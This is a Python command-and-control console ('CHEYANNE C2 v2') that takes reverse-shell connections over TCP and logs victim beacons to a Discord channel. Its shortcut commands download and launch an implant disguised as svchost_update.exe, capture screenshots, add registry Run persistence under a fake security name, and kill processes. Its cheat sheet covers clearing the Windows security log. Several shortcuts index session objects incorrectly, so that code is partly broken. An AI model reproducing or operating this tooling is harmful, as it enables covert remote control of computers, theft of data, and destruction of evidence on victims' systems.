"""
cheyanne_c2_v2.py — Unified C2 Shell (Discord + TCP Reverse Shell)
================================================================
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Dual-channel C2 operator console:
  Channel 1: Discord webhook — monitors recon, heartbeats, logs output
  Channel 2: TCP listener (port 4443) — accepts reverse shell connections

When cheyanne_shell.exe connects, it auto-registers as a session.
'interact <id>' routes commands through the TCP socket.
All output is logged to Discord AND local JSONL.

Usage:
    python shell\\vader_c2_v2.py
    python shell\\vader_c2_v2.py --port 4443
"""

import os
import sys
import json
import time
import socket
import select
import threading
from datetime import datetime

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
LOG_DIR = os.path.join(ROOT_DIR, "reporting", "c2_logs")

GREEN  = "\033[38;2;0;255;65m"
RED    = "\033[38;2;255;68;68m"
AMBER  = "\033[38;2;255;176;0m"
CYAN   = "\033[38;2;0;229;255m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
TEXT   = "\033[38;2;204;204;204m"
WHITE  = "\033[38;2;255;255;255m"
BOLD   = "\033[1m"
RST    = "\033[0m"

LISTEN_PORT = 4443

COMMANDS = ["sessions", "interact", "ls", "ref", "log", "train", "help", "exit", "quit", "back",
            "deploy", "screenshot", "kill", "recon", "persist", "shell"]


class VaderCompleter:
    def __init__(self, c2):
        self.c2 = c2

    def complete(self, text, state):
        line = readline.get_line_buffer().lstrip() if readline else ""
        parts = line.split()

        if len(parts) <= 1 and not line.endswith(" "):
            matches = [c + " " for c in COMMANDS if c.startswith(text.lower())]
        elif parts and parts[0].lower() in ("interact", "use", "i", "kill"):
            prefix = text.lower()
            matches = [sid for sid in self.c2.sessions if sid.startswith(prefix)]
        else:
            matches = []

        return matches[state] if state < len(matches) else None


def load_env(env_path=None):
    paths = [env_path, os.path.join(ROOT_DIR, ".env"), os.path.join(ROOT_DIR, "agent", ".env")]
    for p in paths:
        if p and os.path.exists(p):
            with open(p) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        k, v = line.split("=", 1)
                        os.environ.setdefault(k.strip(), v.strip())
            return p
    return None


def http_post(url, payload, headers=None):
    if HAS_REQUESTS:
        r = requests.post(url, json=payload, headers=headers or {}, timeout=10)
        return r.status_code
    else:
        data = json.dumps(payload).encode("utf-8")
        hdrs = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs)
        try:
            return urllib.request.urlopen(req, timeout=10).status
        except urllib.error.HTTPError as e:
            return e.code


def http_get(url, headers=None):
    if HAS_REQUESTS:
        r = requests.get(url, headers=headers or {}, timeout=10)
        return r.status_code, r.json() if r.status_code == 200 else []
    else:
        hdrs = {"User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return e.code, []


class Session:
    def __init__(self, session_id, hostname="unknown", addr=None, sock=None):
        self.id = session_id
        self.hostname = hostname
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.addr = addr
        self.sock = sock
        self.user = ""
        self.ip = addr[0] if addr else ""
        self.os_info = "Windows"
        self.recon_data = ""
        self.channel = "tcp" if sock else "discord"
        self.alive = True

    def tag(self):
        parts = [self.hostname]
        if self.user:
            parts.append(self.user)
        return "\\".join(parts)

    def since_last(self):
        delta = datetime.now() - self.last_seen
        secs = int(delta.total_seconds())
        if secs < 60:
            return f"{secs}s ago"
        return f"{secs // 60}m ago"

    def send(self, data):
        if self.sock and self.alive:
            try:
                self.sock.sendall((data + "\n").encode())
                return True
            except (OSError, BrokenPipeError):
                self.alive = False
                return False
        return False

    def recv(self, timeout=5):
        if not self.sock or not self.alive:
            return None
        try:
            self.sock.settimeout(timeout)
            chunks = []
            while True:
                try:
                    d = self.sock.recv(4096)
                    if not d:
                        self.alive = False
                        break
                    chunks.append(d.decode("utf-8", errors="replace"))
                    if len(d) < 4096:
                        break
                except socket.timeout:
                    break
            return "".join(chunks) if chunks else None
        except (OSError, ConnectionResetError):
            self.alive = False
            return None


class VaderC2:
    def __init__(self, webhook_url, bot_token, channel_id, port=LISTEN_PORT):
        self.webhook_url = webhook_url
        self.bot_token = bot_token
        self.channel_id = channel_id
        self.port = port
        self.sessions = {}
        self.running = True
        self.active_session = None
        self.command_log = []
        self.last_msg_id = None
        self.listener_sock = None

        os.makedirs(LOG_DIR, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = os.path.join(LOG_DIR, f"c2_v2_{ts}.jsonl")

    def log_event(self, event_type, session_id=None, data=None):
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "event": event_type,
        }
        if session_id:
            entry["session_id"] = session_id
        if data:
            entry["data"] = str(data)[:2000]
        with open(self.log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.command_log.append(entry)

    def discord_log(self, msg):
        if self.webhook_url:
            try:
                http_post(self.webhook_url, {"content": msg[:1990]})
            except Exception:
                pass

    # ── TCP Listener ──

    def start_listener(self):
        self.listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener_sock.bind(("0.0.0.0", self.port))
        self.listener_sock.listen(5)
        self.listener_sock.settimeout(1)

        t = threading.Thread(target=self._accept_loop, daemon=True)
        t.start()

    def _accept_loop(self):
        while self.running:
            try:
                conn, addr = self.listener_sock.accept()
                t = threading.Thread(target=self._handle_connect, args=(conn, addr), daemon=True)
                t.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_connect(self, conn, addr):
        import hashlib
        raw = f"{addr[0]}-{addr[1]}-{time.time()}"
        sid = hashlib.md5(raw.encode()).hexdigest()[:8]

        # drain the initial banner (cmd.exe sends prompt on connect)
        conn.settimeout(3)
        banner = ""
        try:
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                banner += d.decode("utf-8", errors="replace")
                if len(d) < 4096:
                    break
        except socket.timeout:
            pass

        # try to get hostname
        hostname = addr[0]
        try:
            conn.sendall(b"hostname\n")
            conn.settimeout(3)
            resp = b""
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                resp += d
                if len(d) < 4096:
                    break
            lines = resp.decode("utf-8", errors="replace").strip().split("\n")
            skip = ("microsoft", "copyright", "(c)", "c:\\", "c:/")
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                low = line.lower()
                if line.endswith(">") or "\\>" in line:
                    continue
                if any(s in low for s in skip):
                    continue
                hostname = line
                break
        except (socket.timeout, OSError):
            pass

        s = Session(sid, hostname, addr, conn)
        self.sessions[sid] = s

        self.notify(f"{GREEN}[+] SHELL: {sid} connected from {addr[0]}:{addr[1]} ({hostname}){RST}")
        self.log_event("shell_connect", sid, f"{addr[0]}:{addr[1]} {hostname}")
        self.discord_log(f"[SHELL] New reverse shell: {sid} from {addr[0]}:{addr[1]} ({hostname})")

    # ── Discord Polling ──

    def read_channel(self, limit=20):
        if not self.bot_token or not self.channel_id:
            return []
        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages?limit={limit}"
        headers = {"Authorization": f"Bot {self.bot_token}"}
        try:
            status, messages = http_get(url, headers)
            return messages if status == 200 else []
        except Exception:
            return []

    def _ensure_discord_session(self, session_id, hostname="unknown", data=""):
        if session_id not in self.sessions:
            s = Session(session_id, hostname)
            s.channel = "discord"
            s.recon_data = data
            for line in data.split("\n"):
                line = line.strip()
                if line.startswith("user:"):
                    s.user = line.split(":", 1)[1].strip()
                elif "IPv4 Address" in line and ":" in line:
                    s.ip = line.rsplit(":", 1)[1].strip().rstrip("(Preferred)")
            self.sessions[session_id] = s
            self.notify(f"{GREEN}[+] BEACON: {session_id} ({s.tag()}){RST}")
            self.log_event("beacon_new", session_id, s.tag())
        else:
            self.sessions[session_id].last_seen = datetime.now()

    def parse_messages(self, messages):
        import re
        for msg in reversed(messages):
            msg_id = msg.get("id", "")
            content = msg.get("content", "").strip()

            if self.last_msg_id and int(msg_id) <= int(self.last_msg_id):
                continue

            try:
                data = json.loads(content)
            except (json.JSONDecodeError, ValueError):
                if '"session"' in content:
                    sid_m = re.search(r'"session"\s*:\s*"([a-f0-9]+)"', content)
                    host_m = re.search(r'"hostname"\s*:\s*"([^"]+)"', content)
                    if sid_m:
                        self._ensure_discord_session(sid_m.group(1),
                            host_m.group(1) if host_m else "unknown")
                self.last_msg_id = msg_id
                continue

            msg_type = data.get("type")
            session_id = data.get("session")
            hostname = data.get("hostname", "unknown")

            if not session_id:
                self.last_msg_id = msg_id
                continue

            if msg_type == "recon":
                self._ensure_discord_session(session_id, hostname, data.get("data", ""))
            elif msg_type == "output":
                self._ensure_discord_session(session_id, hostname)
                output = data.get("data", "")
                if self.active_session and self.active_session.id == session_id:
                    print(f"\n{output}")
                else:
                    preview = output[:120].replace("\n", " ")
                    self.notify(f"{CYAN}[<] {session_id}: {preview}{RST}")
                self.log_event("output_recv", session_id, output)
            elif msg_type == "heartbeat":
                self._ensure_discord_session(session_id, hostname)

            self.last_msg_id = msg_id

    def poll_loop(self):
        while self.running:
            try:
                messages = self.read_channel(limit=10)
                if messages:
                    self.parse_messages(messages)
            except Exception:
                pass
            # check TCP session liveness
            for sid, s in list(self.sessions.items()):
                if s.channel == "tcp" and s.sock and not s.alive:
                    self.notify(f"{RED}[-] SHELL LOST: {sid} ({s.hostname}){RST}")
                    self.log_event("shell_disconnect", sid)
                    s.channel = "dead"
            time.sleep(3)

    # ── UI ──

    def notify(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.active_session:
            sys.stdout.write(f"\n  [{ts}] {msg}\n")
            sys.stdout.flush()
        else:
            print(f"\n  [{ts}] {msg}")

    def cmd_sessions(self):
        if not self.sessions:
            print(f"  {MUTED}No sessions. Waiting for connections...{RST}")
            return
        print()
        print(f"  {CYAN}  ID        Hostname                  Channel   IP              Last Seen{RST}")
        print(f"  {CYAN}  ──        ────────                  ───────   ──              ─────────{RST}")
        for sid, s in self.sessions.items():
            ch_color = GREEN if s.channel == "tcp" and s.alive else AMBER if s.channel == "discord" else RED
            ch_label = f"{s.channel}{'*' if s.channel == 'tcp' and s.alive else ''}"
            print(f"    {GREEN}{sid}{RST}  {WHITE}{s.hostname:<26s}{RST}{ch_color}{ch_label:<10s}{RST}{DIM}{s.ip:<16s}{RST}{AMBER}{s.since_last()}{RST}")
        print()
        tcp_count = sum(1 for s in self.sessions.values() if s.channel == "tcp" and s.alive)
        disc_count = sum(1 for s in self.sessions.values() if s.channel == "discord")
        print(f"  {DIM}Total: {len(self.sessions)} session(s) — {tcp_count} shell, {disc_count} beacon{RST}")
        print()

    def cmd_interact(self, session_id):
        # partial match
        matches = [sid for sid in self.sessions if sid.startswith(session_id)]
        if len(matches) == 1:
            session_id = matches[0]
        elif len(matches) == 0 and len(self.sessions) == 1:
            session_id = list(self.sessions.keys())[0]
        elif len(matches) > 1:
            print(f"  {RED}[!] Ambiguous: {', '.join(matches)}{RST}")
            return

        if session_id not in self.sessions:
            print(f"  {RED}[!] Session {session_id} not found{RST}")
            return

        s = self.sessions[session_id]
        self.active_session = s

        if s.channel == "tcp" and s.alive:
            print(f"\n  {GREEN}[*] Interactive shell: {s.id} ({s.tag()}) via TCP{RST}")
            print(f"  {AMBER}[*] Type 'back' to return. Commands execute live.{RST}\n")
            self._tcp_interact(s)
        elif s.channel == "discord":
            print(f"\n  {AMBER}[*] Beacon-only session: {s.id} ({s.tag()}){RST}")
            print(f"  {AMBER}[*] No interactive shell — beacon can only receive heartbeats/recon{RST}")
            print(f"  {MUTED}[*] Deploy cheyanne_shell.exe on target for interactive access{RST}\n")
        else:
            print(f"  {RED}[!] Session {session_id} is dead{RST}")

        self.active_session = None

    def _tcp_interact(self, s):
        # drain any pending output
        s.recv(timeout=1)

        try:
            while self.running and s.alive:
                try:
                    prompt = f"  {RED}{s.hostname}{RST}{DIM}>{RST} "
                    cmd = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    break

                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd.lower() == "back":
                    break

                self.log_event("command_sent", s.id, cmd)

                if not s.send(cmd):
                    print(f"  {RED}[!] Connection lost{RST}")
                    break

                time.sleep(0.5)
                output = s.recv(timeout=3)
                if output:
                    print(output, end="")
                    self.log_event("output_recv", s.id, output)
                    # log to Discord (truncated)
                    self.discord_log(f"[{s.id}] {cmd}\n{output[:500]}")

                if not s.alive:
                    print(f"  {RED}[!] Connection lost{RST}")
                    break

        except KeyboardInterrupt:
            print(f"\n  {MUTED}[*] Returning...{RST}")

        self.active_session = None
        print(f"\n  {CYAN}[*] Back to CHEYANNE C2 console{RST}\n")

    def cmd_log(self):
        if not self.command_log:
            print(f"  {MUTED}No log entries.{RST}")
            return
        print(f"\n  {CYAN}── Command Log ──{RST}\n")
        for entry in self.command_log[-30:]:
            ts = entry.get("timestamp", "?")
            ev = entry.get("event", "?")
            sid = entry.get("session_id", "")
            data = entry.get("data", "")
            if ev == "command_sent":
                print(f"    {ts} | {GREEN}{sid[:8]}{RST} | {AMBER}CMD:{RST} {data}")
            elif ev == "output_recv":
                preview = data[:80].replace("\n", " ")
                print(f"    {ts} | {GREEN}{sid[:8]}{RST} | {CYAN}OUT:{RST} {preview}")
            else:
                print(f"    {ts} | {DIM}{ev}{RST}")
        print()

    def cmd_train(self, text=""):
        msg = text or f"[TRAINING LOG] {datetime.now().strftime('%Y-%m-%d %H:%M')}\nSessions: {len(self.sessions)}\nShells: {sum(1 for s in self.sessions.values() if s.channel == 'tcp' and s.alive)}\nCommands: {sum(1 for e in self.command_log if e.get('event') == 'command_sent')}"
        self.discord_log(msg)
        print(f"  {GREEN}[*] Training log posted to #c2{RST}")

    def cmd_ref(self):
        print(f"""
  {CYAN}── Target Command Reference ──{RST}

  {AMBER}RECON & ENUMERATION{RST}
    whoami                               Current user
    whoami /priv                         Privileges
    net user                             All local users
    net localgroup Administrators        Admin group
    systeminfo                           OS version, patches
    ipconfig /all                        Network config
    netstat -ano                         Connections + PIDs
    tasklist                             Running processes

  {AMBER}FILE OPS{RST}
    dir <path>                           List directory
    type <file>                          Read file
    copy <src> <dst>                     Copy file
    del <file>                           Delete file
    mkdir <dir>                          Create directory

  {AMBER}PERSISTENCE{RST}
    reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Name /d "path" /f
    schtasks /create /tn Name /tr "path" /sc onlogon
    schtasks /query /fo LIST             List scheduled tasks

  {AMBER}PROCESS MANAGEMENT{RST}
    taskkill /F /PID <pid>               Kill by PID
    taskkill /F /IM <name>.exe           Kill by name

  {AMBER}OPSEC{RST}
    del /f <file>                        Remove evidence
    wevtutil cl Security                 Clear security log (admin)
""")

    def cmd_help(self):
        print(f"""
  {CYAN}── CHEYANNE C2 v2 Commands ──{RST}

    {WHITE}sessions / ls{RST}              List all sessions (shell + beacon)
    {WHITE}interact <id>{RST}              Interactive shell (TCP sessions)
    {WHITE}ref{RST}                        Target command cheat sheet
    {WHITE}log{RST}                        Show command history
    {WHITE}train{RST}                      Post training log to #c2
    {WHITE}help{RST}                       Show this help
    {WHITE}exit / quit{RST}                Shutdown

  {AMBER}── SHORTCUTS (no 'interact' needed) ──{RST}

    {WHITE}deploy [sid]{RST}               Kill old implant + download + launch fresh
    {WHITE}screenshot [sid]{RST}            Capture screen → C:\\Users\\Public\\screen.png
    {WHITE}kill <proc> [sid]{RST}           taskkill /F /IM on target
    {WHITE}recon [sid]{RST}                 systeminfo + ipconfig + whoami + tasklist
    {WHITE}persist [sid]{RST}               Set HKCU\\Run registry persistence

  {DIM}Partial session IDs work — 'interact c0' matches 'c0205271'{RST}
  {DIM}TCP sessions marked with * are live shells{RST}
  {DIM}Discord sessions are beacon-only (recon + heartbeat){RST}
  {DIM}Shortcuts auto-find first TCP session if no sid given{RST}
""")

    def banner(self):
        print()
        print(f"  {CYAN}╔══════════════════════════════════════════════════════╗")
        print(f"  ║  CHEYANNE C2 v2 — DUAL CHANNEL (Discord + TCP)      ║")
        print(f"  ║  22DIV / george wu                                   ║")
        print(f"  ╚══════════════════════════════════════════════════════╝{RST}")
        print(f"  {CYAN}│{RST}  TCP Listener:  0.0.0.0:{self.port}")
        print(f"  {CYAN}│{RST}  Discord:       {'OK' if self.webhook_url else 'DISABLED'}")
        print(f"  {CYAN}│{RST}  Log:           {self.log_path}")
        print(f"  {CYAN}│{RST}  Started:       {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  {CYAN}╘══════════════════════════════════════════════════════{RST}")
        print()

    def run(self):
        if sys.platform == "win32":
            os.system("")

        self.banner()
        self.log_event("c2_start", data=f"dual_channel port={self.port}")

        # start TCP listener
        self.start_listener()
        print(f"  {GREEN}[*] TCP listener active on port {self.port}{RST}")

        # start Discord poller
        self.poll_thread = threading.Thread(target=self.poll_loop, daemon=True)
        self.poll_thread.start()
        print(f"  {GREEN}[*] Discord poller active{RST}")

        # check existing Discord sessions
        messages = self.read_channel(limit=20)
        if messages:
            self.parse_messages(messages)
            if self.sessions:
                print(f"  {GREEN}[+] Found {len(self.sessions)} existing session(s){RST}")

        if readline:
            comp = VaderCompleter(self)
            readline.set_completer(comp.complete)
            readline.set_completer_delims(" ")
            readline.parse_and_bind("tab: complete")
            print(f"  {GREEN}[*] Tab completion active{RST}")

        print(f"\n  {AMBER}[*] Waiting for connections... Type 'help' for commands{RST}\n")

        try:
            while self.running:
                try:
                    raw = input(f"  {CYAN}chey>{RST} ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                parts = raw.strip().split()
                if not parts:
                    continue

                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ("sessions", "ls"):
                    self.cmd_sessions()
                elif cmd in ("interact", "use", "i"):
                    sid = args[0] if args else ""
                    self.cmd_interact(sid)
                elif cmd == "ref":
                    self.cmd_ref()
                elif cmd == "log":
                    self.cmd_log()
                elif cmd == "train":
                    self.cmd_train(" ".join(args) if args else "")
                elif cmd == "help":
                    self.cmd_help()
                elif cmd in ("exit", "quit"):
                    break

                # ── SHORTCUTS ──
                elif cmd == "deploy":
                    sid = args[0] if args else ""
                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
                    if not matches:
                        print(f"  {RED}[!] No TCP session matching '{sid}'. Use 'sessions' to find one.{RST}")
                    else:
                        s = self.sessions[matches[0]]
                        try:
                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            _s.connect(("8.8.8.8", 80))
                            my_ip = _s.getsockname()[0]
                            _s.close()
                        except Exception:
                            my_ip = "192.168.1.92"
                        deploy_cmd = (
                            f'taskkill /F /IM svchost_update.exe 2>nul & '
                            f'powershell -c "Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
                            f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
                            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'"'
                        )
                        print(f"  {AMBER}[*] Deploying implant via {matches[0][:8]}...{RST}")
                        try:
                            s["socket"].sendall((deploy_cmd + "\n").encode("utf-8"))
                            print(f"  {GREEN}[+] Deploy command sent. Watch Discord #c2 for new session.{RST}")
                        except Exception as e:
                            print(f"  {RED}[!] Send failed: {e}{RST}")

                elif cmd == "screenshot":
                    sid = args[0] if args else ""
                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
                    if not matches:
                        print(f"  {RED}[!] No TCP session matching '{sid}'. Need interactive shell.{RST}")
                    else:
                        s = self.sessions[matches[0]]
                        shot_cmd = (
                            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
                            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
                            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
                            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
                            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
                            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
                            '$g.Dispose(); $bmp.Dispose(); '
                            'echo SCREENSHOT_SAVED"'
                        )
                        print(f"  {AMBER}[*] Capturing screen via {matches[0][:8]}...{RST}")
                        try:
                            s["socket"].sendall((shot_cmd + "\n").encode("utf-8"))
                            print(f"  {GREEN}[+] Screenshot → C:\\Users\\Public\\screen.png on target{RST}")
                            print(f"  {DIM}  Exfil with: exfil C:\\Users\\Public\\screen.png{RST}")
                        except Exception as e:
                            print(f"  {RED}[!] Send failed: {e}{RST}")

                elif cmd == "kill":
                    if not args:
                        print(f"  {DIM}  Usage: kill <process_name> [session_id]{RST}")
                    else:
                        proc_name = args[0]
                        sid = args[1] if len(args) > 1 else ""
                        matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
                        if not matches:
                            print(f"  {RED}[!] No TCP session. Interact first.{RST}")
                        else:
                            s = self.sessions[matches[0]]
                            kill_cmd = f"taskkill /F /IM {proc_name}"
                            try:
                                s["socket"].sendall((kill_cmd + "\n").encode("utf-8"))
                                print(f"  {GREEN}[+] Sent: {kill_cmd}{RST}")
                            except Exception as e:
                                print(f"  {RED}[!] {e}{RST}")

                elif cmd == "recon":
                    sid = args[0] if args else ""
                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
                    if not matches:
                        print(f"  {RED}[!] No TCP session.{RST}")
                    else:
                        s = self.sessions[matches[0]]
                        recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
                        print(f"  {AMBER}[*] Running recon on {matches[0][:8]}...{RST}")
                        try:
                            s["socket"].sendall((recon_cmd + "\n").encode("utf-8"))
                        except Exception as e:
                            print(f"  {RED}[!] {e}{RST}")

                elif cmd == "persist":
                    sid = args[0] if args else ""
                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
                    if not matches:
                        print(f"  {RED}[!] No TCP session.{RST}")
                    else:
                        s = self.sessions[matches[0]]
                        persist_cmd = (
                            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                            '/v WindowsSecurityHealth /t REG_SZ '
                            '/d "C:\\Users\\Public\\svchost_update.exe" /f'
                        )
                        try:
                            s["socket"].sendall((persist_cmd + "\n").encode("utf-8"))
                            print(f"  {GREEN}[+] Persistence set: HKCU\\Run\\WindowsSecurityHealth{RST}")
                        except Exception as e:
                            print(f"  {RED}[!] {e}{RST}")

                else:
                    print(f"  {RED}[!] Unknown: {cmd}. Type 'help'{RST}")

        except KeyboardInterrupt:
            print()

        self.running = False
        if self.listener_sock:
            self.listener_sock.close()
        self.log_event("c2_stop")
        print(f"\n  {MUTED}[*] CHEYANNE C2 shutting down...{RST}")
        print(f"  {MUTED}[*] Log: {self.log_path}{RST}")


def main():
    env_path = None
    port = LISTEN_PORT
    for i, arg in enumerate(sys.argv):
        if arg == "--env" and i + 1 < len(sys.argv):
            env_path = sys.argv[i + 1]
        if arg == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])

    load_env(env_path)

    webhook = os.environ.get("DISCORD_C2_WEBHOOK", "")
    token = os.environ.get("DISCORD_BOT_TOKEN", "")
    channel = os.environ.get("DISCORD_C2_CHANNEL", "")

    c2 = VaderC2(webhook, token, channel, port)
    c2.run()


if __name__ == "__main__":
    main()
